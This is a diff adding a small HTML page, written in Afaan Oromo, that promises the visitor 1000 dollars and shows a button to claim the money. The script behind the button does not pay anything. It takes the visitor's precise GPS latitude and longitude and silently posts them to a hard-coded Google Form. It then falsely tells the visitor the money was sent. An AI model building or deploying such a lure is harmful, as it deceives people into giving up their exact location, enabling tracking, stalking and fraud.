@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<title>Doolaara 1000 argadhe</title>
+</head>
+<body>
+
+<h2>Mo’adhure</h2>
+<button onclick="sendLocation()">Maallaqa argachuuf cuqaasi</button>
+
+<p id="msg"></p>
+
+<script>
+function sendLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(position) {
+
+      let lat = position.coords.latitude;
+      let lng = position.coords.longitude;
+
+      // رابط Google Form (عدله)
+      let formURL = "https://docs.google.com/forms/d/e/1FAIpQLSfr6p1arARQTyRsMASibYuw7rymxMdJqqVkUGHIxJ7mDwsB1A/formResponse";
+
+      let data = new URLSearchParams();
+      data.append("entry.753592983", lat);
+      data.append("entry.1772228248", lng);
+
+      fetch(formURL, {
+        method: "POST",
+        mode: "no-cors",
+        body: data
+      });
+
+      document.getElementById("msg").innerHTML =
+      "✅ Maallaqni milkaa’inaan ergame";
+
+    }, function() {
+      document.getElementById("msg").innerHTML =
+      "❌ didame";
+    });
+  }
+}
+</script>
+
+</body>
+</html>
